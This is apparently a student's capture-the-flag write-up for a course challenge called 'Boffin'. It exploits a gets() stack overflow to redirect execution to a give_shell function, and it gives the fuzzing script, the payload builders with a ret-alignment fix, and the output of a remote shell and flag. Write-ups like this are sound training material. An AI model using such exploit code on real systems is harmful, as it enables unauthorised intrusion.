Writeup for [[Boffin]]
Points: 150
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1337`
Download: `boffin`
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ ./boffin     
Hey! What's your name?
Juneau
Hi, Juneau
```
###### Main Method:
```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char name [32];
  init(param_1);
  puts("Hey! What\'s your name?");
  gets(name);
  printf("Hi, %s\n",name);
  return 0;
}
```
We can see here that this bad boy uses `gets`

Now, main doesn't seem to call anything else, but if we look over at our functions list we'll see one pretty cool one here:
![[Pasted image 20240223140018.png]]
She's beautiful!
###### give Shell
```c
void give_shell(void)
{
  system("/bin/sh");
  return;
}
```

It seems like we want to see where data after our 32 allowed characters goes
Before the call to `gets`, the program saves `[RBP + -0x20]` in `RAX` and then `RDI`
```
undefined main()
	...omitted for brevity...
	004006ed	CALL       <EXTERNAL>::puts  int puts(char * __s)
	004006f2	LEA        RAX=>name,[RBP + -0x20]
	004006f6	MOV        RDI,RAX
	004006f9	CALL       <EXTERNAL>::gets   
	004006fe	LEA        RAX=>name,[RBP + -0x20]
	00400702	MOV        RSI,RAX
	...omitted for brevity...
	0040071a	RET
```
**Note** that offset of 0x20 accounts for exactly 32 characters, like I said

Goal: Call `give_shell` when one of my methods returns

Looking at the input, the program ran normally with 32 and 33 char long inputs, but once I got to 50. characters it started to segfault.

It seemed like the some of the input data was popped off of the top of the stack and into `rip` when main returned, so I wrote a script to bruteforce the data needed to overwrite it:
```python
def segFuzz(p):
	n = 0
	base = b"".join([struct.pack("B", 0x41) for i in range(0,31)])
	while True:
		data = base + b"".join([struct.pack("B", 0x41) for i in range(0,n)])
		p.sendline("r")
		p.sendline(data)
		p.recvuntil("Hi")
		p.recvline()
		if(re.search("exited normally", cleanLine(p.recvline()))):
			n += 1
			print(n)
		else:
			print(cleanLine(p.recvline()))
			p.recvuntil("(gdb)")
			p.sendline("info registers rip")
			ln = cleanLine(p.recvline())
			l = re.split("\s+", ln)
			print(l[2])
			if n == 20:
				p.interactive()
			else:
				n +=1
				print(n)
	print(data)	
```

```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Local_Debug.py
[+] Starting local process '/bin/bash': pid 173019
1
2
...omitted for brevity...
9
Program received signal SIGBUS, Bus error.
0x7ffff7df2600

10
Program received signal SIGSEGV, Segmentation fault.
0x7ffff7df0041

11
Program received signal SIGSEGV, Segmentation fault.
0x7ffff7004141

12
Program received signal SIGSEGV, Segmentation fault.
0x7f0041414141

13
Program received signal SIGSEGV, Segmentation fault.
0x4141414141

14
Program received signal SIGSEGV, Segmentation fault.
0x414141414141

15
Program received signal SIGSEGV, Segmentation fault.
0x414141414141

16
Program received signal SIGSEGV, Segmentation fault.
0x40071a
```
Can see that `RIP` is completely overwritten at n = 14
31 + 14 = 45,

If I can overwrite it with the address of `get_shell`, then that function will be called.
The address is 5 bytes long, meaning so I'll need 40 chars worth of padding

Here's where `give_shell` is in memory:
```
Dump of assembler code for function give_shell:
   0x000000000040069d <+0>:     push   %rbp
   0x000000000040069e <+1>:     mov    %rsp,%rbp
   0x00000000004006a1 <+4>:     mov    $0x4007a4,%edi
   0x00000000004006a6 <+9>:     mov    $0x0,%eax
   0x00000000004006ab <+14>:    call   0x400550 <system@plt>
   0x00000000004006b0 <+19>:    pop    %rbp
   0x00000000004006b1 <+20>:    ret
```

To add the address to the payload, I need to send the bytes in reverse order.
```python
def buildPayload():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,40)])
	data = b"".join([struct.pack("B", 0x9d), struct.pack("B", 0x06), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	return base + data
```

Sending payload to local instance:
```python
def getShell(p):
	payload = buildPayload()
	p.recvuntil("Hey! What's your name?")
	p.sendline(payload)
	p.interactive()
def pwnGDB():
	# Start gdb session
	p =  process('/bin/bash')
	p.sendline('gdb ./boffin -q')
	p.sendline("r")
	getShell(p)
```

Results in a segfault:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Pwn.py
[*] Switching to interactive mode
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e17603 in do_system (line=0x4007a4 "/bin/sh")
    at ../sysdeps/posix/system.c:148
148    ../sysdeps/posix/system.c: No such file or directory.
```
However, we can see that this segmentation error is at `/bin/sh`, meaning we did successfully call `give_shell` and it tried to give us one


Tried on remote instance on a whim and did get a shell
```python
def shellRemote():
	# Start remote session
	p = remote(HOST, PORT)
	getShell(p)
```

Results
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Pwn.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1337: Done
[*] Switching to interactive mode
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@
$ ls
boffin
flag.txt
$ whoami
pwn
$ cat flag.txt
flag{access_granted_thats_real_cool}
```

More crash info:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Pwn.py
[*] Switching to interactive mode
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e17603 in do_system (line=0x4007a4 "/bin/sh")
    at ../sysdeps/posix/system.c:148
148    ../sysdeps/posix/system.c: No such file or directory.
(gdb) $ x/i $pc
=> 0x7ffff7e17603 <do_system+339>:    movaps %xmm0,0x50(%rsp)
```

I think we need it to perform a `ret` to align the stack before calling system
Maybe can push the `ret` address before the `give_shell` address


AH HAH, I love it, it needed padding
```python
def buildSafePld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,40)])
	retAddr = b"".join([struct.pack("B", 0x1a), struct.pack("B", 0x07), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	data = b"".join([struct.pack("B", 0x9d), struct.pack("B", 0x06), struct.pack("B", 0x40), struct.pack("B", 0x00), struct.pack("B", 0x00)])
	pad = b"".join([struct.pack("B", 0x00) for i in range(0,3)])
	return base + retAddr + pad + data
	
def getSafeShell(p):
	payload = buildSafePld()
	p.recvuntil("Hey! What's your name?")
	p.sendline(payload)
	p.interactive()
```

GDB
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Pwn.py
[*] Switching to interactive mode

Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x07@
Breakpoint 1, 0x0000000000400719 in main ()
(gdb) $ info registers rip
rip            0x400719            0x400719 <main+67>
(gdb) $ x/20x $sp
0x7fffffffddd0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffdde0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddf0:    0x41414141    0x41414141    0x0040071a    0x00000000
0x7fffffffde00:    0x0040069d    0x00000000    0x004006d6    0x00000000
0x7fffffffde10:    0x00000000    0x00000001    0xffffdf08    0x00007fff
(gdb) $ c
Continuing.

Breakpoint 2, 0x000000000040071a in main ()
(gdb) $ info registers rip
rip            0x40071a            0x40071a <main+68>
(gdb) $ x/20x $sp
0x7fffffffddf8:    0x0040071a    0x00000000    0x0040069d    0x00000000
0x7fffffffde08:    0x004006d6    0x00000000    0x00000000    0x00000001
0x7fffffffde18:    0xffffdf08    0x00007fff    0xffffdf08    0x00007fff
0x7fffffffde28:    0x0b07d062    0xaa96638a    0x00000000    0x00000000
0x7fffffffde38:    0xffffdf18    0x00007fff    0x00000000    0x00000000
(gdb) $ c
Continuing.

Breakpoint 2, 0x000000000040071a in main ()
(gdb) $ info registers rip
rip            0x40071a            0x40071a <main+68>
(gdb) $ x/20x $sp
0x7fffffffde00:    0x0040069d    0x00000000    0x004006d6    0x00000000
0x7fffffffde10:    0x00000000    0x00000001    0xffffdf08    0x00007fff
0x7fffffffde20:    0xffffdf08    0x00007fff    0x0b07d062    0xaa96638a
0x7fffffffde30:    0x00000000    0x00000000    0xffffdf18    0x00007fff
0x7fffffffde40:    0x00000000    0x00000000    0xf7ffd000    0x00007fff
(gdb) $ c
Continuing.
[Detaching after vfork from child process 405647]

$  zsh: suspended (signal)  python3 Boffin_Pwn.py

```

Local run:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 Boffin_Pwn.py
[+] Starting local process './boffin': pid 360209
/home/kali/Desktop/4-Week/Boffin_Pwn.py:114: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Hey! What's your name?")
[*] Switching to interactive mode

Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x07@
$ whoami
kali
$ pwd
/home/kali/Desktop/4-Week
$  zsh: suspended (signal)  python3 Boffin_Pwn.py

```